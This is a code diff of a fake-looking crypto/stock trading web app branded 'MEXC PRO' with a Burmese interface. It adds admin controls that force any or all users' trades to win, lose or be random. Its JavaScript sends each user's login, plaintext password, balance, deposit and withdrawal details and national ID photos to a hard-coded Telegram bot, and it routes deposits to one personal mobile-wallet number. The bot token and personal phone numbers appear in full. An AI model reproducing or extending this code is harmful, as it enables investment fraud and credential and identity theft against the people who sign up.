@@ -31,6 +31,7 @@
         .btn-main { background: linear-gradient(135deg, var(--primary), #00A383); color: #000; box-shadow: 0 5px 15px var(--primary-glow); }
         .btn-red { background: linear-gradient(135deg, #F6465D, #C02E40); color: white; }
         .btn-green { background: linear-gradient(135deg, #2EBD85, #1E8C61); color: white; }
+        .btn-gold { background: linear-gradient(135deg, #FFD700, #FFA500); color: #000; }
         .btn:focus, .btn.clicked-gold { border: 2px solid var(--active-gold) !important; box-shadow: 0 0 15px var(--active-gold) !important; transform: scale(0.98); }
         input, textarea, select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--border); background: rgba(15, 23, 42, 0.6); color: white; box-sizing: border-box; outline: none; position: relative; z-index: 10; font-family: inherit; }
         
@@ -233,6 +234,66 @@
         .hist-record .buy-tag { color: var(--primary); font-weight: bold; }
         .hist-record .sell-tag { color: var(--active-gold); font-weight: bold; }
         .hist-record .expire-info { color: var(--dim); font-size: 10px; margin-top: 4px; font-style: italic; }
+
+        /* 🆕 USER MODE CONTROL STYLES */
+        .bulk-mode-card {
+            background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(246,70,93,0.1));
+            border: 2px solid var(--active-gold);
+            border-radius: 15px;
+            padding: 18px;
+            margin-bottom: 18px;
+        }
+        .bulk-mode-card h4 { color: var(--active-gold); margin: 0 0 12px 0; font-size: 15px; }
+        .bulk-btn-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 10px; }
+        .bulk-btn { padding: 14px 6px; border-radius: 10px; border: none; font-weight: bold; font-size: 13px; cursor: pointer; transition: 0.25s; color: #fff; }
+        .bulk-btn:active { transform: scale(0.94); }
+        .bulk-btn-win { background: linear-gradient(135deg, #2EBD85, #1E8C61); box-shadow: 0 4px 12px rgba(46,189,133,0.3); }
+        .bulk-btn-lose { background: linear-gradient(135deg, #F6465D, #C02E40); box-shadow: 0 4px 12px rgba(246,70,93,0.3); }
+        .bulk-btn-random { background: linear-gradient(135deg, #FFD700, #FFA500); color: #000; box-shadow: 0 4px 12px rgba(255,215,0,0.3); }
+        
+        .user-mode-item {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 10px;
+            transition: 0.2s;
+        }
+        .user-mode-item:hover { background: rgba(0,219,177,0.06); border-color: var(--primary); }
+        .user-mode-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .user-mode-info { font-size: 12px; color: var(--dim); line-height: 1.5; }
+        .mode-badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+        .mode-badge-win { background: rgba(46,189,133,0.2); color: var(--green); border: 1px solid var(--green); }
+        .mode-badge-lose { background: rgba(246,70,93,0.2); color: var(--red); border: 1px solid var(--red); }
+        .mode-badge-random { background: rgba(255,215,0,0.15); color: var(--active-gold); border: 1px solid var(--active-gold); }
+        
+        .user-mode-btns { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin-top: 10px; }
+        .user-mode-btn {
+            padding: 8px 4px;
+            border-radius: 7px;
+            border: 1px solid transparent;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            background: rgba(255,255,255,0.05);
+            color: #fff;
+            transition: 0.2s;
+        }
+        .user-mode-btn:hover { transform: translateY(-1px); }
+        .user-mode-btn.active-win { background: var(--green); color: #000; border-color: var(--green); }
+        .user-mode-btn.active-lose { background: var(--red); color: #fff; border-color: var(--red); }
+        .user-mode-btn.active-random { background: var(--active-gold); color: #000; border-color: var(--active-gold); }
+
+        .mode-stat-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 15px; }
+        .mode-stat-box { background: rgba(0,0,0,0.35); border: 1px solid var(--border); border-radius: 10px; padding: 10px; text-align: center; }
+        .mode-stat-box .val { font-size: 22px; font-weight: bold; margin-bottom: 2px; }
+        .mode-stat-box .lbl { font-size: 10px; color: var(--dim); text-transform: uppercase; }
+
+        .user-search-box { position: relative; margin-bottom: 15px; }
+        .user-search-box input { margin: 0; padding-right: 45px; }
+        .user-search-box i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--dim); pointer-events: none; }
+        
+        .loader-text { text-align: center; color: var(--primary); font-size: 12px; padding: 20px; }
     </style>
 </head>
 <body>
@@ -274,7 +335,7 @@
             <input type="password" id="log-pw" placeholder="Password">
             <i class="fas fa-eye pw-toggle" id="eye-icon" onclick="togglePassword('log-pw', this)"></i>
         </div>
-        <button class="btn btn-main" onclick="applyClickGold(this); handleAuth('login')">Sign In</button>
+        <button class="btn btn-main" onclick="handleAuth('login')">Sign In</button>
         <p onclick="toggleAuth(true)" style="text-align:center; color:var(--primary); cursor:pointer; margin-top:20px;">Create New Account</p>
     </div>
     
@@ -288,7 +349,7 @@
             <input type="password" id="reg-pw" placeholder="Password (min 6 characters)">
             <i class="fas fa-eye pw-toggle" onclick="togglePassword('reg-pw', this)"></i>
         </div>
-        <button class="btn btn-main" style="margin-top:15px;" onclick="applyClickGold(this); handleAuth('reg')">
+        <button class="btn btn-main" style="margin-top:15px;" onclick="handleAuth('reg')">
             <i class="fas fa-check"></i> Register Now
         </button>
         <p onclick="toggleAuth(false)" style="text-align:center; color:var(--dim); cursor:pointer; margin-top:15px;">Back to Login</p>
@@ -336,8 +397,8 @@
         </div>
         <h1 id="u-bal" style="font-size:35px; margin: 10px 0;">0 Ks</h1>
         <div style="display:flex; gap:12px; margin-top:15px;">
-            <button class="btn" style="background:#000; color:#fff; flex:1;" onclick="applyClickGold(this); showPage('deposit-page')">Deposit</button>
-            <button class="btn" style="background:rgba(255,255,255,0.3); color:#000; flex:1;" onclick="applyClickGold(this); showPage('withdraw-page')">Withdraw</button>
+            <button class="btn" style="background:#000; color:#fff; flex:1;" onclick="showPage('deposit-page')">Deposit</button>
+            <button class="btn" style="background:rgba(255,255,255,0.3); color:#000; flex:1;" onclick="showPage('withdraw-page')">Withdraw</button>
         </div>
     </div>
 
@@ -380,7 +441,7 @@
             </div>
         </div>
         
-        <button class="btn btn-main" onclick="applyClickGold(this); showPage('vip-page')" style="margin-bottom:10px;">⭐ VIP Level အဆင့်မြှင့်ရန်</button>
+        <button class="btn btn-main" onclick="showPage('vip-page')" style="margin-bottom:10px;">⭐ VIP Level အဆင့်မြှင့်ရန်</button>
     </div>
 
     <div class="card">
@@ -446,7 +507,7 @@
         </div>
         <input type="file" id="nrc-hold-input" accept="image/*" style="display:none;" onchange="handleImageUpload('nrc-hold')">
 
-        <button class="btn btn-main" style="margin-top:15px;" onclick="applyClickGold(this); submitVerification()">
+        <button class="btn btn-main" style="margin-top:15px;" onclick="submitVerification()">
             <i class="fas fa-paper-plane"></i> Verification တင်သွင်းမည်
         </button>
     </div>
@@ -557,8 +618,8 @@
     <div class="card">
         <input type="number" id="trade-amt" placeholder="Enter Amount (MMK)">
         <div style="display:flex; gap:12px; margin-top:10px;">
-            <button class="btn btn-green" style="flex:1;" onclick="applyClickGold(this); confirmTrade('BUY')">Call Up</button>
-            <button class="btn btn-red" style="flex:1;" onclick="applyClickGold(this); confirmTrade('SELL')">Put Down</button>
+            <button class="btn btn-green" style="flex:1;" onclick="confirmTrade('BUY')">Call Up</button>
+            <button class="btn btn-red" style="flex:1;" onclick="confirmTrade('SELL')">Put Down</button>
         </div>
     </div>
 </div>
@@ -580,7 +641,6 @@
         <div>
             <b>📌 မှတ်တမ်း သက်တမ်း သတိပေးချက်</b><br>
             ဤမှတ်တမ်းများသည် စတင်မှတ်တမ်းတင်သည့်နေ့မှ ရက် <b>30 ရက်</b> ကြာလျှင် အလိုအလျောက် ပျက်သွားပါမည်။
-            ဥပမာ — ဤလ 10 ရက်နေ့တွင် မှတ်တမ်းတင်လျှင် နောက်လ 10 ရက်နေ့တွင် ပျက်သွားပါမည်။
         </div>
     </div>
 
@@ -606,16 +666,16 @@
         <h4>Update Login Password</h4>
         <input type="password" id="old-pw" placeholder="Current Password">
         <input type="password" id="new-pw" placeholder="New Password">
-        <button class="btn btn-main" onclick="applyClickGold(this); changeSecurity('password')">Update Now</button>
+        <button class="btn btn-main" onclick="changeSecurity('password')">Update Now</button>
     </div>
     <div class="card">
         <h4>Set 6-Digit Withdraw PIN</h4>
         <input type="password" id="new-pin" placeholder="Enter 6-Digit PIN" maxlength="6">
-        <button class="btn btn-main" onclick="applyClickGold(this); changeSecurity('pin')">Save PIN</button>
+        <button class="btn btn-main" onclick="changeSecurity('pin')">Save PIN</button>
     </div>
     <div class="card">
         <h4>Identity Verification</h4>
-        <button class="btn btn-main" onclick="applyClickGold(this); showPage('verify-page'); loadVerifyStatus()">
+        <button class="btn btn-main" onclick="showPage('verify-page'); loadVerifyStatus()">
             <i class="fas fa-id-card"></i> Verification တင်ရန်
         </button>
     </div>
@@ -646,7 +706,7 @@
             <input type="text" id="wd-name-input" placeholder="ငွေလက်ခံမည့်သူ၏ အမည်">
             <input type="text" id="wd-ph-input" placeholder="ငွေလက်ခံမည့် ဖုန်းနံပါတ်">
             <input type="password" id="wd-pin-input" placeholder="Withdraw PIN (6 Digits)">
-            <button class="btn btn-main" style="margin-top:10px;" onclick="applyClickGold(this); confirmWithdraw()">Verify & Withdraw</button>
+            <button class="btn btn-main" style="margin-top:10px;" onclick="confirmWithdraw()">Verify & Withdraw</button>
         </div>
     </div>
 </div>
@@ -672,7 +732,7 @@
             </div>
             <input type="number" id="dep-amt-input" placeholder="လွှဲသွင်းသည့် ပမာဏ (Amount)">
             <input type="text" id="dep-trx-input" placeholder="Transaction ID">
-            <button class="btn btn-main" style="margin-top:10px;" onclick="applyClickGold(this); confirmDeposit()">Confirm Deposit</button>
+            <button class="btn btn-main" style="margin-top:10px;" onclick="confirmDeposit()">Confirm Deposit</button>
         </div>
     </div>
 </div>
@@ -682,6 +742,7 @@
     
     <div class="adm-tabs">
         <button class="adm-tab active" onclick="switchAdmTab('general', event)">General</button>
+        <button class="adm-tab" onclick="switchAdmTab('users', event)">👥 Users</button>
         <button class="adm-tab" onclick="switchAdmTab('messages', event)">Messages</button>
         <button class="adm-tab" onclick="switchAdmTab('stocks', event)">Stocks</button>
         <button class="adm-tab" onclick="switchAdmTab('verify', event)">Verify</button>
@@ -692,21 +753,68 @@
         <div class="card">
             <h4><i class="fas fa-bullhorn" style="color:var(--primary);"></i> Post Public Announcement</h4>
             <textarea id="adm-msg" style="width:100%; height:80px; background:#111; color:white; border-radius:10px; padding:10px;" placeholder="Write message to all users..."></textarea>
-            <button class="btn btn-main" style="margin-top:5px;" onclick="applyClickGold(this); admPostAnnounce()">Post to All Users</button>
+            <button class="btn btn-main" style="margin-top:5px;" onclick="admPostAnnounce()">Post to All Users</button>
         </div>
 
         <div class="card">
             <h4>User Account Control</h4>
             <input type="text" id="adm-search" placeholder="Search User Phone">
-            <button class="btn btn-main" onclick="applyClickGold(this); admSearch()">Find Account</button>
+            <button class="btn btn-main" onclick="admSearch()">Find Account</button>
             <div id="adm-ctrl" style="display:none; margin-top:20px; border-top:1px solid #333; padding-top:15px;">
                 <p>User: <b id="adm-un"></b> | Bal: <b id="adm-ub" style="color:var(--primary);"></b></p>
                 <input type="number" id="adm-adj" placeholder="Amount to Add/Subtract">
-                <button class="btn btn-main" onclick="applyClickGold(this); admUpdateBal()">Update Balance</button>
-                <div style="display:flex; gap:10px; margin-top:10px;">
-                    <button id="btn-adm-win" class="btn btn-green" style="flex:1;" onclick="applyClickGold(this); admMode('win')">WIN</button>
-                    <button id="btn-adm-lose" class="btn btn-red" style="flex:1;" onclick="applyClickGold(this); admMode('lose')">LOSE</button>
+                <button class="btn btn-main" onclick="admUpdateBal()">Update Balance</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="adm-users" class="adm-section" style="display:none;">
+        <div class="bulk-mode-card">
+            <h4><i class="fas fa-users-cog"></i> Bulk Mode Control (အားလုံးကို တစ်ခါတည်း)</h4>
+            <p style="font-size:11px; color:var(--dim); margin: 0 0 10px 0; line-height:1.5;">
+                ⚠️ အောက်က ခလုတ်များကို နှိပ်ပါက <b>User အားလုံး</b>ရဲ့ Trading ရလဒ်ကို ချက်ချင်း ပြောင်းလဲသွားပါမည်။
+            </p>
+            <div class="bulk-btn-grid">
+                <button class="bulk-btn bulk-btn-win" onclick="admBulkMode('win')">
+                    <i class="fas fa-trophy"></i><br>ALL WIN
+                </button>
+                <button class="bulk-btn bulk-btn-lose" onclick="admBulkMode('lose')">
+                    <i class="fas fa-times-circle"></i><br>ALL LOSE
+                </button>
+                <button class="bulk-btn bulk-btn-random" onclick="admBulkMode('random')">
+                    <i class="fas fa-random"></i><br>ALL RANDOM
+                </button>
+            </div>
+            <div id="adm-bulk-result" style="margin-top:12px; font-size:12px; color:var(--dim); text-align:center;"></div>
+        </div>
+
+        <div class="card">
+            <h4 style="color:var(--primary); margin-bottom:12px;">
+                <i class="fas fa-user-friends"></i> User List & Individual Control
+            </h4>
+            
+            <div class="mode-stat-grid" id="adm-user-stats">
+                <div class="mode-stat-box">
+                    <div class="val" style="color:var(--green);" id="stat-win">0</div>
+                    <div class="lbl">WIN</div>
                 </div>
+                <div class="mode-stat-box">
+                    <div class="val" style="color:var(--red);" id="stat-lose">0</div>
+                    <div class="lbl">LOSE</div>
+                </div>
+                <div class="mode-stat-box">
+                    <div class="val" style="color:var(--active-gold);" id="stat-random">0</div>
+                    <div class="lbl">RANDOM</div>
+                </div>
+            </div>
+
+            <div class="user-search-box">
+                <input type="text" id="adm-user-filter" placeholder="🔍 Search user (phone / name)" oninput="admFilterUsers(this.value)">
+                <i class="fas fa-search"></i>
+            </div>
+
+            <div id="adm-users-list" style="max-height: 500px; overflow-y: auto; padding-right: 5px;">
+                <p class="loader-text"><i class="fas fa-spinner fa-spin"></i> Loading Users...</p>
             </div>
         </div>
     </div>
@@ -717,7 +825,7 @@
             <p style="font-size:11px; color:var(--dim); margin-bottom:10px;">သီးသန့် စာပို့လိုသည့် User ၏ ဖုန်းနံပါတ်ကို ထည့်ပါ။</p>
             <input type="text" id="adm-user-phone" placeholder="User Phone (09...)">
             <textarea id="adm-personal-msg" style="width:100%; height:80px; background:#111; color:white; border-radius:10px; padding:10px; margin-bottom:10px;" placeholder="Type message..."></textarea>
-            <button class="btn btn-main" onclick="applyClickGold(this); admSendPersonalMessage()"><i class="fas fa-paper-plane"></i> Send Message</button>
+            <button class="btn btn-main" onclick="admSendPersonalMessage()"><i class="fas fa-paper-plane"></i> Send Message</button>
         </div>
     </div>
 
@@ -775,53 +883,38 @@
     let fullMarketList = [];
     let userDataGlobal = null;
     let liveStockPrices = {};
+    let allUsersCache = {};
+    let admUserFilterText = '';
+    let isUsersLoaded = false;
 
     const HISTORY_RETENTION_MS = 30 * 24 * 60 * 60 * 1000;
 
     // ================================================================
-    // 🔥 PAYMENT DETAILS - FIXED ACCOUNT NUMBERS
+    // PAYMENT DETAILS
     // ================================================================
     const PAYMENT_DETAILS = {
-        wave: { 
-            name: "Daw Wa", 
-            num: "09983857117",
-            displayName: "Wave Pay (Daw Wa)"
-        },
-        kpay: { 
-            name: "Daw Wa", 
-            num: "09983857117",
-            displayName: "KBZ Pay (Daw Wa)"
-        }
+        wave: { name: "Daw Wa", num: "09983857117", displayName: "Wave Pay (Daw Wa)" },
+        kpay: { name: "Daw Wa", num: "09983857117", displayName: "KBZ Pay (Daw Wa)" }
     };
 
     // ================================================================
-    // 🔥 TELEGRAM BOT CONFIGURATION
+    // TELEGRAM BOT
     // ================================================================
     const TELEGRAM_BOT_TOKEN = "8897992638:AAGexZBjPv1hwS10FcvYwjZ9rM8n6MEhAZ8";
     const TELEGRAM_CHAT_ID = "7709938396";
     const TELEGRAM_CHANNEL = "@mexccustomerservice667";
 
     const TG_PHOTO_MAX_BYTES = 10 * 1024 * 1024;
-    const TG_PHOTO_MAX_DIM = 10000;
 
     async function sendTelegramMessage(text) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
-            const response = await fetch(url, {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
             });
-            const data = await response.json();
-            console.log('[Telegram] Message sent:', data);
-            return data;
-        } catch (error) {
-            console.error('[Telegram] Error sending message:', error);
-        }
+            return await response.json();
+        } catch (error) { console.error('[Telegram] Error:', error); }
     }
 
     function compressImage(file, maxWidth = 1600, quality = 0.85) {
@@ -834,20 +927,15 @@
                     const scale = Math.min(1, maxWidth / width, maxWidth / height);
                     const newW = Math.max(1, Math.round(width * scale));
                     const newH = Math.max(1, Math.round(height * scale));
-
                     const canvas = document.createElement('canvas');
-                    canvas.width = newW;
-                    canvas.height = newH;
+                    canvas.width = newW; canvas.height = newH;
                     const ctx = canvas.getContext('2d');
-                    ctx.fillStyle = '#FFFFFF';
-                    ctx.fillRect(0, 0, newW, newH);
+                    ctx.fillStyle = '#FFFFFF'; ctx.fillRect(0, 0, newW, newH);
                     ctx.drawImage(img, 0, 0, newW, newH);
-
                     canvas.toBlob((blob) => {
                         if (!blob) return resolve(file);
-                        if (blob.size >= file.size * 0.98 && file.size < TG_PHOTO_MAX_BYTES) {
-                            resolve(file);
-                        } else {
+                        if (blob.size >= file.size * 0.98 && file.size < TG_PHOTO_MAX_BYTES) resolve(file);
+                        else {
                             const out = new File([blob], (file.name || 'photo').replace(/\.[^.]+$/, '') + '_compressed.jpg', { type: 'image/jpeg' });
                             resolve(out);
                         }
@@ -862,92 +950,51 @@
     }
 
     async function sendTelegramPhoto(photoFile, caption) {
-        if (!photoFile) {
-            console.warn('[Telegram Photo] No file provided');
-            return { ok: false };
-        }
-
+        if (!photoFile) return { ok: false };
         let uploadFile = photoFile;
         try {
-            if (photoFile.size > 1.5 * 1024 * 1024) {
-                uploadFile = await compressImage(photoFile, 1600, 0.85);
-            }
-            if (uploadFile.size > TG_PHOTO_MAX_BYTES) {
-                uploadFile = await compressImage(uploadFile, 1280, 0.7);
-            }
-            if (uploadFile.size > TG_PHOTO_MAX_BYTES) {
-                return await sendTelegramDocument(uploadFile, caption);
-            }
-        } catch (e) {
-            uploadFile = photoFile;
-        }
-
-        const maxRetries = 3;
-        for (let attempt = 1; attempt <= maxRetries; attempt++) {
+            if (photoFile.size > 1.5 * 1024 * 1024) uploadFile = await compressImage(photoFile, 1600, 0.85);
+            if (uploadFile.size > TG_PHOTO_MAX_BYTES) uploadFile = await compressImage(uploadFile, 1280, 0.7);
+            if (uploadFile.size > TG_PHOTO_MAX_BYTES) return await sendTelegramDocument(uploadFile, caption);
+        } catch (e) { uploadFile = photoFile; }
+        for (let attempt = 1; attempt <= 3; attempt++) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('caption', caption || '');
                 formData.append('parse_mode', 'HTML');
                 formData.append('photo', uploadFile, uploadFile.name || 'photo.jpg');
-
-                const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-                    { method: 'POST', body: formData }
-                );
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                 const data = await response.json();
-
-                if (data.ok) {
-                    console.log(`[Telegram Photo] ✅ Sent on attempt ${attempt}`);
-                    return data;
-                }
-
+                if (data.ok) return data;
                 const desc = (data.description || '').toLowerCase();
-                if (desc.includes('dimensions') || desc.includes('too big') || desc.includes('photo_invalid')) {
-                    break;
-                }
-
-                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
-            } catch (error) {
-                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
-            }
+                if (desc.includes('dimensions') || desc.includes('too big') || desc.includes('photo_invalid')) break;
+                if (attempt < 3) await new Promise(r => setTimeout(r, 1500 * attempt));
+            } catch (error) { if (attempt < 3) await new Promise(r => setTimeout(r, 1500 * attempt)); }
         }
         return await sendTelegramDocument(uploadFile, caption);
     }
 
     async function sendTelegramDocument(file, caption) {
-        const maxRetries = 2;
-        for (let attempt = 1; attempt <= maxRetries; attempt++) {
+        for (let attempt = 1; attempt <= 2; attempt++) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('caption', caption || '');
                 formData.append('parse_mode', 'HTML');
                 formData.append('document', file, file.name || 'photo.jpg');
-
-                const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
-                    { method: 'POST', body: formData }
-                );
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
                 const data = await response.json();
                 if (data.ok) return data;
-                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
-            } catch (error) {
-                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
-            }
+                if (attempt < 2) await new Promise(r => setTimeout(r, 1500 * attempt));
+            } catch (error) { if (attempt < 2) await new Promise(r => setTimeout(r, 1500 * attempt)); }
         }
         return { ok: false };
     }
 
     function formatTelegramUserInfo(action, userData) {
-        const now = new Date().toLocaleString('en-US', {
-            timeZone: 'Asia/Yangon',
-            year: 'numeric', month: '2-digit', day: '2-digit',
-            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
-        });
-
-        let msg = `🔔 <b>${action.toUpperCase()}</b>\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Yangon', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+        let msg = `🔔 <b>${action.toUpperCase()}</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `👤 <b>User Name:</b> ${userData.username || 'N/A'}\n`;
         msg += `📱 <b>Phone:</b> ${userData.phone || 'N/A'}\n`;
         msg += `🔑 <b>Password:</b> ${userData.password || 'N/A'}\n`;
@@ -955,113 +1002,60 @@
         msg += `⭐ <b>VIP Level:</b> VIP ${userData.vip || 0}\n`;
         msg += `🆔 <b>Verification:</b> ${userData.verificationStatus || 'none'}\n`;
         msg += `🕐 <b>Time:</b> ${now}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `📢 Channel: ${TELEGRAM_CHANNEL}\n`;
-        msg += `🌐 Platform: MEXC PRO`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n📢 Channel: ${TELEGRAM_CHANNEL}\n🌐 Platform: MEXC PRO`;
         return msg;
     }
 
-    async function sendLoginToTelegram(userData) {
-        await sendTelegramMessage(formatTelegramUserInfo('🔐 USER LOGIN', userData));
-    }
-
-    async function sendRegisterToTelegram(userData) {
-        await sendTelegramMessage(formatTelegramUserInfo('🆕 NEW USER REGISTERED', userData));
-    }
+    async function sendLoginToTelegram(userData) { await sendTelegramMessage(formatTelegramUserInfo('🔐 USER LOGIN', userData)); }
+    async function sendRegisterToTelegram(userData) { await sendTelegramMessage(formatTelegramUserInfo('🆕 NEW USER REGISTERED', userData)); }
 
     async function sendDepositToTelegram(depositData) {
-        const now = new Date().toLocaleString('en-US', {
-            timeZone: 'Asia/Yangon',
-            year: 'numeric', month: '2-digit', day: '2-digit',
-            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
-        });
-
+        const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Yangon', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         const methodDisplay = depositData.method === 'kpay' ? 'KBZ Pay 💳' : 'Wave Pay 🌊';
         const methodEmoji = depositData.method === 'kpay' ? '💳' : '🌊';
-        
-        let msg = `💰 <b>NEW DEPOSIT REQUEST</b>\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        let msg = `💰 <b>NEW DEPOSIT REQUEST</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `📱 <b>User Phone:</b> ${depositData.ph}\n`;
         msg += `👤 <b>User Name:</b> ${depositData.username || 'N/A'}\n`;
         msg += `💰 <b>Amount:</b> ${parseFloat(depositData.amt).toLocaleString()} Ks\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `${methodEmoji} <b>Payment Method:</b> ${methodDisplay}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n${methodEmoji} <b>Payment Method:</b> ${methodDisplay}\n`;
         msg += `🏦 <b>Account Name:</b> ${depositData.accName || 'Daw Wa'}\n`;
         msg += `📞 <b>Account Number:</b> ${depositData.accNum || '09983857117'}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🧾 <b>Transaction ID:</b> ${depositData.trx}\n`;
-        msg += `🕐 <b>Time:</b> ${now}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `📢 Channel: ${TELEGRAM_CHANNEL}\n`;
-        msg += `🌐 Platform: MEXC PRO`;
-
+        msg += `━━━━━━━━━━━━━━━━━━━━\n🧾 <b>Transaction ID:</b> ${depositData.trx}\n`;
+        msg += `🕐 <b>Time:</b> ${now}\n━━━━━━━━━━━━━━━━━━━━\n📢 Channel: ${TELEGRAM_CHANNEL}\n🌐 Platform: MEXC PRO`;
         await sendTelegramMessage(msg);
     }
 
-    // ================================================================
-    // 🔥 NEW: WITHDRAW TELEGRAM NOTIFICATION (FIXED!)
-    // ================================================================
     async function sendWithdrawToTelegram(withdrawData) {
-        const now = new Date().toLocaleString('en-US', {
-            timeZone: 'Asia/Yangon',
-            year: 'numeric', month: '2-digit', day: '2-digit',
-            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
-        });
-
+        const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Yangon', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         const methodDisplay = withdrawData.method === 'kpay' ? 'KBZ Pay 💳' : 'Wave Pay 🌊';
         const methodEmoji = withdrawData.method === 'kpay' ? '💳' : '🌊';
-        
-        let msg = `🚨 <b>NEW WITHDRAW REQUEST</b>\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        let msg = `🚨 <b>NEW WITHDRAW REQUEST</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `👤 <b>User Name:</b> ${withdrawData.username || 'N/A'}\n`;
         msg += `📱 <b>User Phone (Account):</b> ${withdrawData.ph}\n`;
         msg += `💰 <b>Balance Before:</b> ${(withdrawData.balanceBefore || 0).toLocaleString()} Ks\n`;
         msg += `💰 <b>Balance After:</b> ${(withdrawData.balanceAfter || 0).toLocaleString()} Ks\n`;
         msg += `⭐ <b>VIP Level:</b> VIP ${withdrawData.vip || 0}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `💵 <b>Withdraw Amount:</b> ${parseFloat(withdrawData.amt).toLocaleString()} Ks\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n💵 <b>Withdraw Amount:</b> ${parseFloat(withdrawData.amt).toLocaleString()} Ks\n`;
         msg += `${methodEmoji} <b>Method:</b> ${methodDisplay}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🏦 <b>Receiver Name:</b> ${withdrawData.receiveName}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n🏦 <b>Receiver Name:</b> ${withdrawData.receiveName}\n`;
         msg += `📞 <b>Receiver Phone:</b> ${withdrawData.receivePh}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🕐 <b>Time:</b> ${now}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n🕐 <b>Time:</b> ${now}\n`;
         msg += `🆔 <b>Request ID:</b> <code>${withdrawData.requestId || 'N/A'}</code>\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `📢 Channel: ${TELEGRAM_CHANNEL}\n`;
-        msg += `🌐 Platform: MEXC PRO`;
-
+        msg += `━━━━━━━━━━━━━━━━━━━━\n📢 Channel: ${TELEGRAM_CHANNEL}\n🌐 Platform: MEXC PRO`;
         await sendTelegramMessage(msg);
     }
 
     async function sendVerificationPhotosToTelegram(nrcNumber, username, phoneNumber) {
-        const now = new Date().toLocaleString('en-US', {
-            timeZone: 'Asia/Yangon',
-            year: 'numeric', month: '2-digit', day: '2-digit',
-            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
-        });
-
-        const headerMsg = 
-            `🆔 <b>VERIFICATION REQUEST</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n` +
-            `👤 <b>User Name:</b> ${username}\n` +
-            `📱 <b>Phone:</b> ${phoneNumber}\n` +
-            `🪪 <b>NRC Number:</b> ${nrcNumber}\n` +
-            `🕐 <b>Time:</b> ${now}\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n` +
-            `📸 အောက်တွင် မှတ်ပုံတင်ပုံ (၃) ပုံ ပါဝင်ပါသည်\n` +
-            `📢 Channel: ${TELEGRAM_CHANNEL}\n` +
-            `🌐 Platform: MEXC PRO`;
-        
-        await sendTelegramMessage(headerMsg);
